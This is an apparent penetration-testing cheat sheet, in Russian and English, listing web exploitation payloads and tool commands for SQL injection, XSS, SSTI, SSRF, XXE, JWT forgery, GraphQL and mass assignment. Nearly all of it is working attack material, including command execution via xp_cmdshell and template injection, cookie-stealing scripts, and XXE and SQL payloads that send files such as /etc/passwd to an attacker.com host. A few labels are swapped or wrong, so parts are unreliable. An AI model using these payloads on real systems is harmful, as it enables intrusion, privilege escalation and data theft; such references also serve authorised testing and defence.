# 🌐 Web Application Security Cheat Sheet

**Полное руководство по эксплуатации веб-уязвимостей.**  
Включает техники для SQL Injection, XSS, SSTI, SSRF, XXE, JWT, GraphQL и массовые атаки.

---

## 📚 Оглавление
1. [SQL Injection (SQLi)](#-sql-injection-sqli)
2. [Cross-Site Scripting (XSS)](#-cross-site-scripting-xss)
3. [Server-Side Template Injection (SSTI)](#-server-side-template-injection-ssti)
4. [Server-Side Request Forgery (SSRF)](#-server-side-request-forgery-ssrf)
5. [XML External Entity (XXE)](#-xml-external-entity-xxe)
6. [JWT Attacks](#-jwt-attacks)
7. [GraphQL Attacks](#-graphql-attacks)
8. [Mass Assignment](#-mass-assignment)
9. [Полезные инструменты](#-полезные-инструменты)

---

## 🗄️ SQL Injection (SQLi)

### 1.1 Обнаружение SQLi

| Пейлоад | Описание (RU) | Описание (EN) |
|---------|---------------|---------------|
| `'` | Вызов ошибки для проверки уязвимости. | Trigger error to test vulnerability. |
| `' OR '1'='1` | Обход аутентификации. | Bypass authentication. |
| `' UNION SELECT NULL--` | Проверка количества столбцов. | Check number of columns. |
| `' WAITFOR DELAY '0:0:5'--` | Проверка через задержку (MSSQL). | Test via delay (MSSQL). |

### 1.2 Автоматизация через sqlmap

```bash
# Базовое сканирование
sqlmap -u "http://target/page?id=1" --batch

# Получение баз данных
sqlmap -u "http://target/page?id=1" --dbs

# Получение таблиц
sqlmap -u "http://target/page?id=1" -D database_name --tables

# Дамп таблицы
sqlmap -u "http://target/page?id=1" -D database_name -T table_name --dump

# Обход WAF
sqlmap -u "http://target/page?id=1" --tamper=space2comment --random-agent
1.3 Manual SQL Injection Payloads
MySQL / MariaDB
# Получение версии
' UNION SELECT @@version,2,3-- -

# Список баз данных
' UNION SELECT schema_name,2,3 FROM information_schema.schemata-- -

# Чтение файлов
' UNION SELECT LOAD_FILE('/etc/passwd'),2,3-- -

MSSQL / SQL Server
# Получение версии
' UNION SELECT @@version,2,3-- -

# Выполнение команд (xp_cmdshell)
'; EXEC xp_cmdshell 'whoami';--

# Чтение файлов
'; CREATE TABLE readfile (data VARCHAR(8000)); BULK INSERT readfile FROM 'C:\Windows\win.ini'; SELECT data FROM readfile;--

PostgreSQL
# Получение версии
' UNION SELECT version(),2,3-- -

# Чтение файлов
' UNION SELECT pg_read_file('/etc/passwd'),2,3-- -

Oracle
# Получение версии
' UNION SELECT banner,2,3 FROM v$version-- -

# Чтение файлов
' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com'),2,3 FROM dual-- -

1.4 Time-Based Blind SQLi
# MySQL
' AND SLEEP(5)-- -

# MSSQL
' WAITFOR DELAY '0:0:5'-- -

# PostgreSQL
' AND pg_sleep(5)-- -

Cross-Site Scripting (XSS)
2.1 Обнаружение XSS
Пейлоад	Описание (RU)	Описание (EN)
<script>alert(1)</script>	Базовый тест.	Basic test.
<img src=x onerror=alert(1)>	Тест через событие onerror.	Test via onerror event.
javascript:alert(1)	Тест в URL.	Test in URL.
"><svg onload=alert(1)>	Обход атрибутов.	Bypass attributes.
2.2 Обход фильтров
Пейлоад	Описание (RU)	Описание (EN)
<scr<script>ipt>alert(1)</scr<script>ipt>	Двойная вставка тегов.	Double tag insertion.
<img src=x onerror=alert(String.fromCharCode(88,83,83))>	Обход через charcode.	Bypass via charcode.
%3Cscript%3Ealert(1)%3C/script%3E	URL-кодирование.	URL encoding.

2.3 DOM-Based XSS
# Проверка через location.hash
javascript:alert(document.cookie)

# Эксплуатация через URL
http://target/page#<script>alert(document.cookie)</script>

2.4 Автоматизация XSS
# XSStrike
python3 xsstrike.py -u "http://target/page?param=test" --crawl

# dalfox
dalfox url "http://target/page?param=test" -b "https://xss.report"

Server-Side Template Injection (SSTI)
3.1 Обнаружение SSTI
Пейлоад	Ожидаемый результат	Описание
{{7*7}}	49	Jinja2, Twig, Freemarker
${7*7}	49	Freemarker, Velocity
{{7*'7'}}	7777777	Jinja2 (Python)
<%= 7*7 %>	49	ERB (Ruby)

3.2 Эксплуатация по движкам
Jinja2 (Python)
# Проверка версии
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}

# RCE
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}

Twig (PHP)
# Проверка
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# RCE
{{_self.env.setCache("ftp://attacker:12345")}}

Freemarker (Java)
# Проверка
${7*7}

# RCE
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

ERB (Ruby)
# Проверка
<%= 7*7 %>

# RCE
<%= system('id') %>

Server-Side Request Forgery (SSRF)
4.1 Базовые пейлоады
Пейлоад	Описание (RU)	Описание (EN)
http://169.254.169.254/latest/meta-data/	Доступ к метаданным AWS.	Access AWS metadata.
http://127.0.0.1:80/admin	Доступ к локальному сервису.	Access local service.
file:///etc/passwd	Чтение локальных файлов.	Read local files.
gopher://127.0.0.1:25/_HELO	Атака на внутренние сервисы (SMTP).	Attack internal services.

4.2 Обход фильтров
Пейлоад	Описание
http://0.0.0.0:80	Альтернативная запись localhost.
http://127.127.127.127	Обход через десятичную нотацию.
http://[::1]:80	IPv6 localhost.
http://localhost@evil.com	Обход через URL-авторизацию.

4.3 Автоматизация SSRF
# SSRFmap
git clone https://github.com/swisskyrepo/SSRFmap
cd SSRFmap
python3 ssrfmap.py -r request.txt -p url -d 'http://169.254.169.254/latest/meta-data/'

# Burp Suite Extensions
# - Collaborator Everywhere
# - SSRF Scanner

XML External Entity (XXE)
5.1 Базовые пейлоады
<!-- Чтение файлов -->
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

<!-- SSRF через XXE -->
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root>&xxe;</root>

<!-- Blind XXE через OOB (Out-of-Band) -->
<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
%dtd;
]>
<root>&send;</root>

5.2 Злоумышленный DTD файл (evil.dtd)
<!ENTITY % payload "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?data=%file;'>">
%payload;

5.3 XXE с ошибками
<!-- Провокация ошибки для получения данных -->
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY % error SYSTEM "http://attacker.com/%xxe;">
%error;
]>
<root>test</root>

JWT Attacks
6.1 Алгоритмическая атака (None Algorithm)
# Генерация токена с alg: none
import jwt
payload = {"user": "admin"}
token = jwt.encode(payload, key="", algorithm="none")
print(token)

# Проверка
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.

6.2 Атака смены алгоритма (RS256 → HS256)
# Получение публичного ключа
openssl s_client -connect target.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > pubkey.pem

# Генерация токена с HS256
python3 -c "
import jwt
public_key = open('pubkey.pem').read()
print(jwt.encode({'user': 'admin'}, key=public_key, algorithm='HS256'))
"

6.3 Атака на слабый секрет
# Брутфорс секрета
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# jwt_tool
jwt_tool eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciJ9.hash -C

GraphQL Attacks
7.1 Интроспекция GraphQL
# Запрос интроспекции
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}

# Получение всех запросов
{
  __schema {
    queryType {
      fields {
        name
        args {
          name
          type {
            name
          }
        }
      }
    }
  }
}

7.2 Автоматизация GraphQL
# GraphQLmap
git clone https://github.com/swisskyrepo/GraphQLmap
cd GraphQLmap
python3 graphqlmap.py -u http://target.com/graphql -i

# InQL (Burp Extension)
# - Вкладка Extensions → BApp Store → InQL

7.3 GraphQL брутфорс
# Перебор ID
query {
  user(id: 1) { name, email, password }
}

Mass Assignment
8.1 Обнаружение массовой загрузки
# Попытка добавить поле is_admin в POST запрос
POST /api/user/register
Content-Type: application/json

{
  "username": "test",
  "password": "pass",
  "is_admin": true
}

8.2 Эксплуатация
# Добавление поля роли
PUT /api/user/1
Content-Type: application/json

{
  "username": "test",
  "role": "admin"
}

# Добавление поля через заголовки
X-Forwarded-User: admin
X-User-Role: administrator

8.3 Автоматизация Mass Assignment
# ffuf для поиска параметров
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -X POST -u http://target/api/user -d "FUZZ=test"

Полезные инструменты
Инструмент	Назначение
sqlmap	Автоматизация SQL-инъекций
XSStrike	Обнаружение и эксплуатация XSS
dalfox	Быстрый сканер XSS
SSRFmap	Эксплуатация SSRF
GraphQLmap	Атаки на GraphQL
jwt_tool	Атаки на JWT
Burp Suite	Универсальный прокси для веб-тестирования
ffuf	Быстрый фаззинг параметров
hakrawler	Краулер для поиска эндпоинтов
📚 Источники и дополнительная литература
PayloadsAllTheThings — Web

OWASP Testing Guide

PortSwigger Web Security Academy
